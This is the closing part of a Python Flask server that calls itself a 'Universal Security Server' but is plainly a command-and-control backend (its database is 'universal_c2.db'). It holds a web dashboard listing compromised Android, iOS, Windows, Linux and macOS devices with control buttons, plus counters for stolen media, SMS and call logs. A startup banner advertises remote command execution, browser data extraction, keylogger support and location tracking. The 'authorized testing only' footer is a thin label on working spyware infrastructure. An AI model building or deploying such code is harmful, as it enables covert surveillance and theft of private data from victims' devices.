                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                color: #333;
            }
            
            .container {
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
            }
            
            .header {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 30px;
                margin-bottom: 30px;
                color: white;
                text-align: center;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            }
            
            .header h1 {
                font-size: 2.5em;
                margin-bottom: 10px;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            }
            
            .header p {
                opacity: 0.9;
                margin-bottom: 20px;
            }
            
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            
            .stat-card {
                background: white;
                border-radius: 15px;
                padding: 20px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                transition: transform 0.3s;
            }
            
            .stat-card:hover {
                transform: translateY(-5px);
            }
            
            .stat-card h3 {
                color: #666;
                font-size: 0.9em;
                text-transform: uppercase;
                letter-spacing: 1px;
                margin-bottom: 10px;
            }
            
            .stat-number {
                font-size: 2em;
                font-weight: bold;
                color: #667eea;
                margin-bottom: 5px;
            }
            
            .device-list {
                background: white;
                border-radius: 15px;
                padding: 20px;
                margin-bottom: 30px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }
            
            .device-list h2 {
                margin-bottom: 20px;
                color: #333;
                border-bottom: 2px solid #667eea;
                padding-bottom: 10px;
            }
            
            table {
                width: 100%;
                border-collapse: collapse;
            }
            
            th, td {
                padding: 12px;
                text-align: left;
                border-bottom: 1px solid #eee;
            }
            
            th {
                background: #f8f9fa;
                font-weight: 600;
                color: #666;
            }
            
            .status-online {
                color: #10b981;
                font-weight: 600;
            }
            
            .status-offline {
                color: #ef4444;
                font-weight: 600;
            }
            
            .status-idle {
                color: #f59e0b;
                font-weight: 600;
            }
            
            .platform-badge {
                display: inline-block;
                padding: 4px 8px;
                border-radius: 12px;
                font-size: 0.8em;
                font-weight: 600;
                margin-right: 5px;
            }
            
            .android { background: #3ddc84; color: white; }
            .ios { background: #000; color: white; }
            .windows { background: #0078d7; color: white; }
            .linux { background: #fcc624; color: #333; }
            .macos { background: #999; color: white; }
            
            .footer {
                text-align: center;
                padding: 20px;
                color: white;
                opacity: 0.7;
                font-size: 0.9em;
            }
            
            .controls {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                gap: 10px;
                margin-top: 20px;
            }
            
            .btn {
                background: #667eea;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 8px;
                cursor: pointer;
                font-weight: 600;
                transition: background 0.3s;
            }
            
            .btn:hover {
                background: #5a67d8;
            }
            
            @media (max-width: 768px) {
                .container {
                    padding: 10px;
                }
                
                .header {
                    padding: 20px;
                }
                
                .header h1 {
                    font-size: 1.8em;
                }
                
                table {
                    font-size: 0.9em;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔒 Universal Security Dashboard</h1>
                <p>Cross-Platform Device Management & Monitoring</p>
                <div class="controls">
                    <button class="btn" onclick="loadStats()">🔄 Refresh</button>
                    <button class="btn" onclick="window.open('/api/v1/stats', '_blank')">📊 Stats</button>
                    <button class="btn" onclick="window.open('/api/v1/health', '_blank')">🩺 Health</button>
                </div>
            </div>
            
            <div id="stats" class="stats-grid">
                <!-- Stats loaded dynamically -->
            </div>
            
            <div class="device-list">
                <h2>📱 Connected Devices</h2>
                <div id="devices">
                    <!-- Devices loaded dynamically -->
                </div>
            </div>
            
            <div class="footer">
                <p>Universal Security Server v2.0 | For authorized testing only</p>
                <p>Supports: Android, iOS, Windows, Linux, macOS, Tablets</p>
            </div>
        </div>
        
        <script>
            async function loadStats() {
                try {
                    // Load statistics
                    const statsResponse = await fetch('/api/v1/stats');
                    const statsData = await statsResponse.json();
                    
                    // Update stats grid
                    const statsDiv = document.getElementById('stats');
                    statsDiv.innerHTML = `
                        <div class="stat-card">
                            <h3>Total Devices</h3>
                            <div class="stat-number">${statsData.devices.total}</div>
                            <p>${statsData.devices.online} online</p>
                        </div>
                        <div class="stat-card">
                            <h3>Media Files</h3>
                            <div class="stat-number">${statsData.media.total}</div>
                            <p>${statsData.media.total_size_str}</p>
                        </div>
                        <div class="stat-card">
                            <h3>Commands Executed</h3>
                            <div class="stat-number">${statsData.commands.total}</div>
                            <p>${statsData.commands.by_status?.completed || 0} completed</p>
                        </div>
                        <div class="stat-card">
                            <h3>Communications</h3>
                            <div class="stat-number">${statsData.communications.total}</div>
                            <p>SMS & Call logs</p>
                        </div>
                    `;
                    
                    // Load devices
                    const devicesResponse = await fetch('/api/v1/devices');
                    const devicesData = await devicesResponse.json();
                    
                    const devicesDiv = document.getElementById('devices');
                    
                    if (devicesData.devices.length === 0) {
                        devicesDiv.innerHTML = '<p>No devices connected</p>';
                        return;
                    }
                    
                    let tableHTML = `
                        <table>
                            <thead>
                                <tr>
                                    <th>Device</th>
                                    <th>Platform</th>
                                    <th>Status</th>
                                    <th>Last Seen</th>
                                    <th>IP Address</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                    `;
                    
                    devicesData.devices.forEach(device => {
                        const platformClass = device.platform.toLowerCase();
                        const statusClass = `status-${device.status}`;
                        
                        tableHTML += `
                            <tr>
                                <td>
                                    <strong>${device.device_name}</strong><br>
                                    <small>${device.model || 'Unknown model'}</small>
                                </td>
                                <td>
                                    <span class="platform-badge ${platformClass}">
                                        ${device.platform_icon} ${device.platform}
                                    </span>
                                </td>
                                <td class="${statusClass}">
                                    ${device.status_display}
                                </td>
                                <td>${device.last_seen_str}</td>
                                <td>${device.ip_address || 'Unknown'}</td>
                                <td>
                                    <button class="btn" onclick="controlDevice('${device.device_id}')">
                                        Control
                                    </button>
                                </td>
                            </tr>
                        `;
                    });
                    
                    tableHTML += '</tbody></table>';
                    devicesDiv.innerHTML = tableHTML;
                    
                } catch (error) {
                    console.error('Error loading data:', error);
                    document.getElementById('stats').innerHTML = '<p>Error loading statistics</p>';
                    document.getElementById('devices').innerHTML = '<p>Error loading devices</p>';
                }
            }
            
            function controlDevice(deviceId) {
                alert(`Control device ${deviceId}\nUse console application for full control.`);
                // In real implementation, open control panel for this device
            }
            
            // Load data on page load
            loadStats();
            
            // Auto-refresh every 30 seconds
            setInterval(loadStats, 30000);
        </script>
    </body>
    </html>
    '''

# ============================================================================
# MAINTENANCE
# ============================================================================

def cleanup_old_data():
    """Cleanup old data periodically"""
    while True:
        time.sleep(3600)  # Run every hour
        try:
            conn = get_db()
            cursor = conn.cursor()
            current_time = time.time()
            
            # Remove devices not seen for 30 days
            cursor.execute('DELETE FROM devices WHERE ? - last_seen > 2592000', (current_time,))
            
            # Remove old media files (keep for 90 days)
            cursor.execute('SELECT media_id, file_path FROM media WHERE ? - created_at > 7776000', (current_time,))
            old_media = cursor.fetchall()
            
            for media in old_media:
                try:
                    if os.path.exists(media['file_path']):
                        os.remove(media['file_path'])
                except:
                    pass
            
            cursor.execute('DELETE FROM media WHERE ? - created_at > 7776000', (current_time,))
            
            conn.commit()
            conn.close()
            
            logger.info("Cleanup completed")
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}")

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Start cleanup thread
    threading.Thread(target=cleanup_old_data, daemon=True).start()
    
    # Banner
    print("""
╔══════════════════════════════════════════════════════════╗
║              UNIVERSAL SECURITY SERVER                  ║
║          Cross-Platform Device Management               ║
╚══════════════════════════════════════════════════════════╝

    🌍 Platform Support:
    • 🤖 Android Phones/Tablets
    • 🍎 iOS/iPadOS Devices
    • 🪟 Windows Desktop/Laptop
    • 🐧 Linux Systems
    • 💻 macOS Computers
    
    📊 Features:
    • Real-time device monitoring
    • Cross-platform command execution
    • Media & file management
    • SMS/Call log collection
    • Browser data extraction
    • Keylogger support
    • Location tracking
    
    🔒 Security:
    • Encrypted communications
    • Role-based access control
    • Audit logging
    • Data retention policies
    
    🚀 Server Info:
    • Database: universal_c2.db
    • Media Folder: media/
    • Port: 5000
    • Web Dashboard: /
    
    Starting server...
    """)
    
    port = int(os.environ.get('PORT', 5000))
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        threaded=True,
        ssl_context='adhoc' if os.environ.get('USE_SSL') else None
    )
